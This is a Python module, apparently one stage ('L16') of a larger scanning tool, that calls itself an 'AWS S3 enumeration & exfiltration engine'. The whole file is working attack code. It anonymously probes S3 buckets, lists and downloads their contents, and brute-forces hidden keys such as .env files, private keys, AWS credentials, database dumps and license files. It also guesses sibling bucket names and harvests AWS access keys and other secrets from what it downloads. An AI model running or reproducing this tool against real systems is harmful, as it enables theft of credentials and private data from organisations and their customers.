"""L16 — AWS S3 enumeration & exfiltration engine.

Capabilities
------------
1.  Identify a bucket from its hostname (virtual-hosted or path-style URL),
    or from any `s3://` reference found in earlier stages.
2.  Detect the bucket's region from response headers without using AWS creds.
3.  Try anonymous ListBucket with full pagination (handles >1000 objects).
4.  When ListBucket is forbidden, brute-force object keys built from:
       - file names of every entry in `.git/index`
       - common high-value keys (.env, backups, secrets/, keys/, db dumps)
5.  Brute a list of subsidiary bucket names (org-name-prod, org-name-backup, …)
       built from the target host + any tokens we recover.
6.  Save every downloaded object to `<scan_dir>/s3/<bucket>/<key>` (sqlmap-style)
       and re-scan their bodies for secrets.
7.  Grep the local recovered_source tree for AWS access keys (AKIA / ASIA) and
       report them.
"""
from __future__ import annotations

import asyncio
import re
import xml.etree.ElementTree as ET
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

from ..secrets.patterns import Finding, scan_text
from .http_client import HttpClient

S3_HOST_RE = re.compile(
    r"^(?:https?://)?"
    r"(?:(?P<bucket1>[a-z0-9.\-]{3,63})\.s3"
    r"(?:[.-](?P<region1>[a-z0-9-]+))?"
    r"\.amazonaws\.com"
    r"|s3(?:[.-](?P<region2>[a-z0-9-]+))?\.amazonaws\.com/(?P<bucket2>[a-z0-9.\-]{3,63}))"
    r"/?",
    re.I,
)
NS = {"s3": "http://s3.amazonaws.com/doc/2006-03-01/"}

COMMON_S3_OBJECTS = [
    ".env", ".env.production", ".env.dev", ".env.local", "env.txt",
    "config.json", "config.yml", "config.yaml", "config.php",
    "settings.json", "secrets.json", "secret.json", "credentials.json",
    "backup.sql", "backup.zip", "backup.tar.gz", "db.sql", "dump.sql",
    "database.sql", "users.csv", "users.json", "customers.json",
    "license.json", "licenses.json", "licenses/active.json",
    "licenses/customers.json", "licenses/master.json",
    "id_rsa", "id_rsa.pem", "private.key", "private.pem",
    "keys/private.pem", "keys/server.pem", "keys/master.pem",
    ".aws/credentials", "aws/credentials", "credentials",
    "Dockerfile", "docker-compose.yml", "docker-compose.yaml",
    "composer.json", "composer.lock", "package.json", "package-lock.json",
    "robots.txt", "sitemap.xml", "swagger.json", "openapi.json",
    ".git/HEAD", ".git/config", ".git/index",
    "logs/access.log", "logs/error.log", "logs/app.log",
    "admin.conf", "wp-config.php", "phpinfo.php",
]

SUBSIDIARY_SUFFIXES = [
    "", "-backup", "-backups", "-prod", "-production", "-dev",
    "-staging", "-stage", "-test", "-qa", "-uat",
    "-data", "-cdn", "-uploads", "-public", "-private", "-internal",
    "-assets", "-images", "-media", "-files", "-archive",
    "-logs", "-logging", "-db", "-database", "-dump", "-export",
    "-secrets", "-keys", "-config", "-configs",
    "-web", "-api", "-app", "-admin", "-portal",
]

AWS_KEY_RE = re.compile(r"\b(AKIA|ASIA)[0-9A-Z]{16}\b")


@dataclass
class S3Bucket:
    name: str
    region: Optional[str] = None
    accessible: bool = False
    list_allowed: bool = False
    object_count: int = 0
    sampled_objects: list[str] = field(default_factory=list)
    error_code: Optional[str] = None


@dataclass
class S3Report:
    buckets: list[S3Bucket] = field(default_factory=list)
    objects_downloaded: list[dict] = field(default_factory=list)
    aws_keys_found: list[dict] = field(default_factory=list)
    findings: list[Finding] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)


def parse_s3_url(url: str) -> tuple[Optional[str], Optional[str]]:
    """Return (bucket, region) extracted from any S3 URL."""
    m = S3_HOST_RE.match(url.strip())
    if not m:
        return None, None
    bucket = m.group("bucket1") or m.group("bucket2")
    region = m.group("region1") or m.group("region2")
    if region in (None, "amazonaws", "dualstack"):
        region = None
    return bucket, region


async def probe_bucket(client: HttpClient, bucket: str,
                       region: Optional[str] = None) -> S3Bucket:
    """Probe a bucket, detect region, classify access."""
    info = S3Bucket(name=bucket, region=region)
    host = (f"{bucket}.s3.{region}.amazonaws.com" if region
            else f"{bucket}.s3.amazonaws.com")
    r = await client._request(f"https://{host}/")
    # Look for x-amz-bucket-region in headers
    detected = (r.headers.get("x-amz-bucket-region")
                or r.headers.get("X-Amz-Bucket-Region"))
    if detected:
        info.region = detected
    body = r.content or b""

    if r.status == 404 and b"NoSuchBucket" in body:
        info.error_code = "NoSuchBucket"
        return info
    if r.status == 403 or b"AccessDenied" in body:
        info.error_code = "AccessDenied"
        info.accessible = True   # bucket exists, just locked
        return info
    if r.status == 301 or b"PermanentRedirect" in body:
        # Try with the corrected region
        m = re.search(rb"<Endpoint>([^<]+)</Endpoint>", body)
        if m:
            new_host = m.group(1).decode()
            r2 = await client._request(f"https://{new_host}/")
            body = r2.content
            r = r2
            info.region = (r2.headers.get("x-amz-bucket-region") or info.region)
    if 200 <= r.status < 300 and b"<ListBucketResult" in body:
        info.accessible = True
        info.list_allowed = True
        info.object_count, info.sampled_objects = _parse_list(body)
    return info


def _parse_list(xml: bytes) -> tuple[int, list[str]]:
    try:
        root = ET.fromstring(xml)
    except ET.ParseError:
        return 0, []
    keys = [k.text or "" for k in root.findall("s3:Contents/s3:Key", NS)]
    return len(keys), keys


async def list_bucket_full(client: HttpClient, bucket: S3Bucket,
                            max_keys: int = 5000) -> list[str]:
    """ListBucket with pagination. Returns full key list (capped at max_keys)."""
    if not bucket.list_allowed:
        return []
    keys: list[str] = []
    marker = ""
    host = (f"{bucket.name}.s3.{bucket.region}.amazonaws.com" if bucket.region
            else f"{bucket.name}.s3.amazonaws.com")
    for _ in range(40):  # safety bound
        url = f"https://{host}/?marker={marker}&max-keys=1000"
        r = await client._request(url)
        if r.status != 200 or not r.content:
            break
        n, batch = _parse_list(r.content)
        keys.extend(batch)
        if len(keys) >= max_keys:
            keys = keys[:max_keys]
            break
        # IsTruncated?
        if b"<IsTruncated>true</IsTruncated>" not in r.content:
            break
        marker = batch[-1] if batch else ""
    return keys


async def download_objects(client: HttpClient, bucket: S3Bucket,
                            keys: list[str], dest_root: Path,
                            limit: int = 200) -> list[dict]:
    """Download up to `limit` objects from `bucket` into dest_root/<bucket>/<key>."""
    out: list[dict] = []
    host = (f"{bucket.name}.s3.{bucket.region}.amazonaws.com" if bucket.region
            else f"{bucket.name}.s3.amazonaws.com")
    bucket_root = dest_root / bucket.name
    bucket_root.mkdir(parents=True, exist_ok=True)

    async def one(key: str):
        url = f"https://{host}/{key}"
        r = await client._request(url)
        if 200 <= r.status < 300 and r.content:
            safe = key.lstrip("/").replace("..", "_")
            target = bucket_root / safe
            target.parent.mkdir(parents=True, exist_ok=True)
            try:
                target.write_bytes(r.content)
                out.append({"bucket": bucket.name, "key": key,
                             "size": len(r.content), "saved_to": str(target)})
            except OSError:
                pass

    # Prioritize high-value extensions
    priority_kw = (".env", ".sql", ".pem", ".key", "secret", "credential",
                   "config", "license", "backup", ".json", ".yml", ".yaml",
                   ".php", ".py", ".js")
    sorted_keys = sorted(keys, key=lambda k: 0 if any(p in k.lower()
                          for p in priority_kw) else 1)
    sorted_keys = sorted_keys[:limit]
    CHUNK = 10
    for i in range(0, len(sorted_keys), CHUNK):
        await asyncio.gather(*(one(k) for k in sorted_keys[i:i + CHUNK]),
                              return_exceptions=True)
    return out


async def brute_subsidiary_buckets(client: HttpClient, base_name: str,
                                    extra_tokens: list[str]) -> list[S3Bucket]:
    """Discover sibling buckets like <base>-prod, <token>-backup, etc."""
    seen: set[str] = set()
    candidates: list[str] = []
    tokens = [base_name] + list(set(extra_tokens))
    for tok in tokens:
        tok = tok.lower().strip()
        if not re.match(r"^[a-z0-9.\-]{3,50}$", tok):
            continue
        for suffix in SUBSIDIARY_SUFFIXES:
            name = f"{tok}{suffix}"
            if name not in seen and 3 <= len(name) <= 63:
                seen.add(name)
                candidates.append(name)
    results: list[S3Bucket] = []

    async def one(b: str):
        info = await probe_bucket(client, b)
        if info.accessible or info.error_code == "AccessDenied":
            results.append(info)
    CHUNK = 25
    for i in range(0, len(candidates), CHUNK):
        await asyncio.gather(*(one(c) for c in candidates[i:i + CHUNK]),
                              return_exceptions=True)
    return results


async def brute_objects(client: HttpClient, bucket: S3Bucket,
                         hints: list[str], dest_root: Path) -> list[dict]:
    """When ListBucket is denied, try a list of plausible keys."""
    keys = list(dict.fromkeys(COMMON_S3_OBJECTS + hints))
    return await download_objects(client, bucket, keys, dest_root, limit=len(keys))


def extract_aws_keys_from_dir(root: Path) -> list[dict]:
    """Walk a directory and find AWS access key IDs in any text file."""
    out: list[dict] = []
    if not root.exists():
        return out
    for p in root.rglob("*"):
        if not p.is_file() or p.stat().st_size > 5_000_000:
            continue
        try:
            text = p.read_text(encoding="utf-8", errors="replace")
        except Exception:
            continue
        for m in AWS_KEY_RE.findall(text):
            out.append({"key_id": m, "file": str(p)})
    return out


async def run_s3_enumeration(
    client: HttpClient,
    target_url: str,
    scan_artifacts: dict,
    out_dir: Path,
    log=None,
) -> S3Report:
    """Top-level entry: drives all S3 logic and returns an S3Report."""
    log = log or (lambda *a, **kw: None)
    report = S3Report()
    s3_root = out_dir / "s3"
    s3_root.mkdir(parents=True, exist_ok=True)

    # 1) Collect seed buckets — from target host + known refs in recovered source
    seeds: list[tuple[str, Optional[str]]] = []
    parsed_b, parsed_r = parse_s3_url(target_url)
    if parsed_b:
        seeds.append((parsed_b, parsed_r))

    # Scan recovered_source for s3:// or *.s3.amazonaws.com mentions
    src = out_dir / "recovered_source"
    extra_tokens: list[str] = []
    if src.exists():
        for p in src.rglob("*"):
            if p.is_file() and p.stat().st_size < 2_000_000:
                try:
                    text = p.read_text(encoding="utf-8", errors="replace")
                except Exception:
                    continue
                for m in re.findall(r"s3://([a-z0-9.\-]{3,63})", text, re.I):
                    seeds.append((m.lower(), None))
                for m in re.findall(
                    r"([a-z0-9.\-]{3,63})\.s3(?:[.-]([a-z0-9-]+))?\.amazonaws\.com",
                    text, re.I,
                ):
                    seeds.append((m[0].lower(), m[1] or None))
                # also any "bucket = X" hints
                for m in re.findall(r"bucket['\":\s=]+['\"]([a-z0-9.\-]{3,63})['\"]",
                                     text, re.I):
                    extra_tokens.append(m.lower())

    # Always probe the user-supplied hints from scan_artifacts (cli option)
    for hint in scan_artifacts.get("s3_hints") or []:
        b, r = parse_s3_url(hint) if hint.startswith(("http", "s3:")) else (hint, None)
        if b:
            seeds.append((b, r))

    # Dedupe
    seen_seeds: set[tuple[str, Optional[str]]] = set()
    unique_seeds = []
    for s in seeds:
        if s not in seen_seeds:
            seen_seeds.add(s)
            unique_seeds.append(s)

    # 2) Probe every seed
    for bname, region in unique_seeds:
        log(f"[L16] probing s3://{bname}")
        info = await probe_bucket(client, bname, region)
        report.buckets.append(info)
        if info.list_allowed:
            keys = await list_bucket_full(client, info)
            info.object_count = len(keys)
            info.sampled_objects = keys[:50]
            downloaded = await download_objects(client, info, keys, s3_root)
            report.objects_downloaded.extend(downloaded)
            log(f"[L16] {bname}: listed {len(keys)} keys, downloaded "
                f"{len(downloaded)} objects")
        elif info.error_code == "AccessDenied":
            # Build hints from .git/index paths
            hints = []
            for e in scan_artifacts.get("index_entries", []) or []:
                p = e.get("path", "")
                if p:
                    hints.append(p)
                    hints.append(p.lstrip("/"))
                    if "/" in p:
                        hints.append(p.split("/")[-1])
            downloaded = await brute_objects(client, info, hints, s3_root)
            report.objects_downloaded.extend(downloaded)
            log(f"[L16] {bname}: ACCESSDENIED on List → "
                f"brute-forced {len(downloaded)} objects")

    # 3) Subsidiary bucket brute (using bucket names we already know + extra tokens)
    base_tokens = [b.name for b in report.buckets] + extra_tokens
    if base_tokens:
        log(f"[L16] enumerating subsidiaries from {len(base_tokens)} tokens")
        subs = await brute_subsidiary_buckets(client,
                                                base_tokens[0],
                                                base_tokens + extra_tokens)
        for sb in subs:
            if sb.name not in {b.name for b in report.buckets}:
                report.buckets.append(sb)
                log(f"[L16] FOUND sibling bucket: {sb.name} "
                    f"({sb.error_code or 'OPEN'})")

    # 4) Extract AWS keys from everywhere
    report.aws_keys_found.extend(extract_aws_keys_from_dir(src))
    report.aws_keys_found.extend(extract_aws_keys_from_dir(s3_root))

    # 5) Scan every downloaded S3 object body for secrets
    for obj in report.objects_downloaded:
        path = Path(obj["saved_to"])
        if path.stat().st_size > 2_000_000:
            continue
        try:
            text = path.read_text(encoding="utf-8", errors="replace")
        except Exception:
            continue
        for f in scan_text(text, file_path=f"s3://{obj['bucket']}/{obj['key']}",
                            source="L16-s3"):
            report.findings.append(f)

    report.notes.append(f"probed {len(report.buckets)} buckets, "
                        f"downloaded {len(report.objects_downloaded)} objects, "
                        f"found {len(report.aws_keys_found)} AWS keys, "
                        f"{len(report.findings)} new secrets")
    return report
